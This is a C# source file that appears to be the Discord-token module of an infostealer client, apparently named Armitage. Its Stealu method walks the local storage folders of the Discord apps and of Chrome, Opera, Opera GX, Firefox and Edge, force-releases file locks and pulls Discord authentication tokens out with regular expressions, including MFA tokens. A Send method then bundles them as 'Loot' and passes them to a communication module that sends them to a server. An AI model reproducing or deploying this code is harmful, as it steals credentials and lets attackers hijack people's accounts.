using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Client.Armitage.Cookies
{
    public static class Discord_Token
    {
        /// <summary>
        /// Steals discord token from the Windows app.
        /// </summary>
        public static List<Tuple<string, string>> Stealu()
        {

            List<Tuple<string, string>> discordtokens = new List<Tuple<string, string>>();

            string[] paths = new string[] {
                // discord pc
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb",
                // discord canary
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb",
                 // discord ptb
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb",
                // chromu
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb",
                // opera, who tf uses this
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb",
                // opera, but cancer
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb",
                // firufoxu
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Mozilla\Firefox\Profiles\Default\Local Storage\leveldb",
                // micrusufu edgu
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage",
            };
            foreach (string i in paths)
            {
                DirectoryInfo rootfolder = new DirectoryInfo(i);

                if (rootfolder.Exists)
                {
                    var logfiles = Utilities.Files_And_Pathing.GetFilesByExtensions(rootfolder, ".log", ".ldb");

                    foreach (var file in logfiles)
                    {
                        Utilities.Files_And_Pathing.KillLocks(file.FullName);

                        string readedfile = file.OpenText().ReadToEnd();

                        foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        {
                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
                        }

                        foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
                    }
                }
                else
                {
                    Console.WriteLine($"path doesnt exist : {i}");
                }
            }
            return discordtokens;
        }

        public static string GetTokenFromLogDir(string dir)
        {
            if (Directory.Exists(dir))
            {
                foreach (FileInfo file in new DirectoryInfo(dir).GetFiles())
                {
                    if (file.Extension.ToLower() == ".log")
                    {

                        string contents = File.ReadAllText(file.FullName);
                        if (contents.ToLower().Contains("oken"))
                        {
                            return contents;
                        }

                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Sends the discord token to the server.
        /// </summary>
        public async static void Send(List<Tuple<string, string>> tokens)
        {
            await Task.Run(() =>
            {
                // var tokens = Stealu();
                // format the thing into a single string
                StringBuilder sb = new StringBuilder();

                sb.AppendLine("==< Discord Tokens >==");

                foreach (var i in tokens)
                {
                    sb.AppendLine($"From: {i.Item1} Got: {i.Item2}");
                }

                Communication.String_Stacker.Send(sb.ToString(), Communication.String_Stacker.StringType.Loot);
            });
        }
    }
}
